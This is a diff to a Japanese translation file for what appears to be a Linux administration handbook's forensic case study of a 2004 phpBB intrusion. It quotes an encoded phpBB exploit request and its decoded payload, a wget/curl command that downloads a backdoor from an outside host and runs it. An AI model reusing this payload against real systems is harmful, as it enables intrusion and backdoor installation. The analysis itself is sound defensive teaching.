 "www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] \"GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1\" 200 27969 \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\"\n"
 "      "
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "This example matches exploitation of an old security vulnerability in phpBB. <ulink type=\"block\" url=\"http://secunia.com/advisories/13239/\" /> <ulink type=\"block\" url=\"http://www.phpbb.com/phpBB/viewtopic.php?t=240636\" />"
 msgstr "これは phpBB の古いセキュリティ脆弱性を突いた例です。<ulink type=\"block\" url=\"http://secunia.com/advisories/13239/\" /><ulink type=\"block\" url=\"http://www.phpbb.com/phpBB/viewtopic.php?t=240636\" />"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Decoding this long URL leads to understanding that the attacker managed to run some PHP code, namely: <command>system(\"cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;\")</command>. Indeed, a <filename>bd</filename> file was found in <filename>/tmp/</filename>. Running <command>strings /mnt/tmp/bd</command> returns, among other strings, <literal>PsychoPhobia Backdoor is starting...</literal>. This really looks like a backdoor."
-msgstr "長い URL を復号することで、攻撃者がいくつかの PHP コードを実行しようと試みたことが理解できます。はっきり言うと、<command>system(\"cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;\")</command> です。確かに、<filename>bd</filename> ファイルが <filename>/tmp/</filename> の中で見つかりました。<command>strings /mnt/tmp/bd</command> を実行したところ、他の文字列に混じって、<literal>PsychoPhobia Backdoor is starting...</literal> が返されました。これはまさにバックドアのように見えます。"
+msgstr "長い URL を復号することで、攻撃者がいくつかの PHP コードを実行しようと試みたことが理解できます。ここでは <command>system(\"cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;\")</command> を実行しようと試みています。確かに、<filename>bd</filename> ファイルが <filename>/tmp/</filename> の中で見つかりました。<command>strings /mnt/tmp/bd</command> を実行したところ、他の文字列に混じって、<literal>PsychoPhobia Backdoor is starting...</literal> が返されました。これはまさにバックドアのように見えます。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "Some time later, this access was used to download, install and run an IRC <emphasis>bot</emphasis> that connected to an underground IRC network. The bot could then be controlled via this protocol and instructed to download files for sharing. This program even has its own log file:"
-msgstr "しばらくの後、このアクセスは地下 IRC ネットワークに接続する IRC <emphasis>ボット</emphasis>をダウンロード、インストール、実行するために使われました。このボットは IRC プロトコルを介して制御され、共有するファイルをダウンロードする指示を与えられました。このプログラムは自分自身のログファイルを持っています。"
+msgstr "しばらくの後、このアクセスは地下 IRC ネットワークに接続する IRC <emphasis>ボット</emphasis>をダウンロード、インストール、実行するために使われました。この IRC ボットは IRC プロトコルを介して制御され、共有するファイルをダウンロードする指示を与えられました。IRC ボットは以下に示す自分専用のログファイルを持っています。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid ""
 "** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)\n"
 "** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT\n"
@@ -2772,14 +2952,17 @@ msgstr ""
 "(...)\n"
 "** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "These traces show that two video files have been stored on the server by way of the 82.50.72.202 IP address."
-msgstr "ログに残された痕跡によれば、82.50.72.202 IP アドレスを経由して 2 つのビデオファイルがサーバ上に保存されたことがわかります。"
+msgstr "ログに残された痕跡によれば、82.50.72.202 という IP アドレスを経由して 2 つのビデオファイルがサーバ上に保存されたことがわかります。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "In parallel, the attacker also downloaded a pair of extra files, <filename>/tmp/pt</filename> and <filename>/tmp/loginx</filename>. Running these files through <command>strings</command> leads to strings such as <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> and <foreignphrase>Now wait for suid shell...</foreignphrase>. These look like programs exploiting local vulnerabilities to obtain administrative privileges. Did they reach their target? In this case, probably not, since no files seem to have been modified after the initial breach."
-msgstr "並行して、攻撃者はさらにファイルをダウンロードしました。<filename>/tmp/pt</filename> と <filename>/tmp/loginx</filename> です。<command>strings</command> を介してこれらのファイルを調べると、<foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> や <foreignphrase>Now wait for suid shell...</foreignphrase> などの文字列が見つかりました。プログラムは管理者権限を取得するためにローカルの脆弱性を不正利用しているように見えます。攻撃者は目標を達成したでしょうか? この場合、おそらくまだでしょう。なぜなら、最初の破壊行為の後どのファイルも修正されていなかったからです。"
+msgstr "並行して、攻撃者はさらに <filename>/tmp/pt</filename> と <filename>/tmp/loginx</filename> にファイルをダウンロードしました。<command>strings</command> を使ってこれらのファイルを調べると、<foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> や <foreignphrase>Now wait for suid shell...</foreignphrase> などの文字列が見つかりました。プログラムは管理者権限を取得するためにローカルの脆弱性を不正利用しているように見えます。攻撃者は目標を達成したでしょうか? この場合、おそらくまだでしょう。なぜなら、最初の破壊行為の後どのファイルも修正されていなかったからです。"
 
+# Checked-By: Ryuunosuke Ayanokouzi;
 msgid "In this example, the whole intrusion has been reconstructed, and it can be deduced that the attacker has been able to take advantage of the compromised system for about three days; but the most important element in the analysis is that the vulnerability has been identified, and the administrator can be sure that the new installation really does fix the vulnerability."
-msgstr "この例では、不正侵入のすべてが再構成されました。そして、攻撃者は不正侵入されたシステムを 3 日間にわたって悪用することができたと推測することが可能です。しかし、解析で明らかになった最も重要な要素は脆弱性の内容です。管理者は新規インストールによって完全にこの種の脆弱性が修正されたことを保証することが可能です。"
+msgstr "この例では、不正侵入の手続きのすべてが再構成されました。そして、攻撃者は不正侵入されたシステムを約 3 日間にわたって悪用することができたと推測することが可能です。しかし、解析で明らかになった最も重要な要素は脆弱性の内容です。管理者は新規インストールによって完全にこの種の脆弱性が修正されたことを保証することが可能です。"
 
 #~ msgid "<literal>SNAT</literal> (only in the <literal>nat</literal> table, therefore only in IPv4 on <emphasis role=\"distribution\">Wheezy</emphasis> — NAT support for IPv6 appeared in the Linux 3.7 kernel): apply <emphasis>Source NAT</emphasis> (extra options describe the exact changes to apply);"
 #~ msgstr "<literal>SNAT</literal> (<literal>nat</literal> テーブル、つまり <emphasis role=\"distribution\">Wheezy</emphasis> の IPv4 の中だけでのみ使うことが可能です — IPv6 の NAT サポートは Linux 3.7 カーネルから導入されました)。これは <emphasis>Source NAT</emphasis> を適用します (追加オプションを使って適用する正確な変更を設定します)。"
